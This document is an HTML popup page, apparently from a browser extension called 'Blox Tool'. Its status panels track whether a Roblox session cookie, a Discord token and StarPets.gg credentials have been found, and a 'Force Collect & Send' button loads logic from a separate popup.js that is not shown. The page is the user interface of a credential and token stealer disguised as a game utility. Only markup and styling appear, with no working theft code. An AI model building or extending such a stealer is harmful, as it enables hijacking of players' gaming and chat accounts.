<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      width: 320px;
      background: #0b0e14;
      font-family: 'Inter', sans-serif;
      color: #e8edf5;
      padding: 16px;
    }
    .header {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 14px;
    }
    .header img { width: 32px; height: 32px; border-radius: 8px; }
    .header h1 { font-size: 18px; font-weight: 800; color: #e8edf5; }
    .status {
      background: #131a24;
      border-radius: 10px;
      padding: 10px 14px;
      margin-bottom: 12px;
      font-size: 13px;
    }
    .status .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
    .dot.g { background: #22c55e; box-shadow: 0 0 8px #22c55e88; }
    .dot.r { background: #ef4444; }
    .section {
      background: #131a24;
      border-radius: 10px;
      padding: 12px;
      margin-bottom: 10px;
    }
    .section .title {
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: #6b7d98;
      margin-bottom: 8px;
    }
    .creds {
      background: #0d1117;
      border-radius: 6px;
      padding: 8px;
      font-family: monospace;
      font-size: 11px;
      color: #94a3b8;
      word-break: break-all;
      max-height: 60px;
      overflow: hidden;
    }
    .creds.found { color: #22c55e; border-left: 3px solid #22c55e; }
    .creds.missing { color: #6b7d98; border-left: 3px solid #ef4444; }
    .btn {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      font-family: 'Inter', sans-serif;
      font-weight: 700;
      font-size: 13px;
      cursor: pointer;
      margin-bottom: 6px;
      transition: all 0.2s;
    }
    .btn.g { background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; }
    .btn.g:hover { box-shadow: 0 4px 16px rgba(34,197,94,0.3); }
    .btn.b { background: #1e293b; color: #e8edf5; }
    .btn.b:hover { background: #2a3a4e; }
    .log { font-size: 10px; color: #4a5a70; text-align: center; margin-top: 8px; }
  </style>
</head>
<body>
  <div class="header">
    <img src="icon.png" alt="">
    <h1>Blox Tool</h1>
  </div>

  <div class="status">
    <span id="statusDot" class="dot r"></span>
    <span id="statusText">Not connected</span>
    <span style="float:right;color:#6b7d98;" id="userLabel">-</span>
  </div>

  <div class="section">
    <div class="title">🎮 Roblox Cookie</div>
    <div class="creds missing" id="robloxStatus">Waiting...</div>
  </div>

  <div class="section">
    <div class="title">💬 Discord Token</div>
    <div class="creds missing" id="discordStatus">Waiting...</div>
  </div>

  <div class="section">
    <div class="title">🐾 StarPets.gg</div>
    <div class="creds missing" id="starpetsStatus">Waiting...</div>
  </div>

  <button class="btn g" id="grabBtn">⚡ Force Collect & Send</button>
  <button class="btn b" id="refreshBtn">⟳ Refresh Status</button>

  <div class="log" id="logBox">[Ready]</div>

  <script src="popup.js"></script>
</body>
</html>
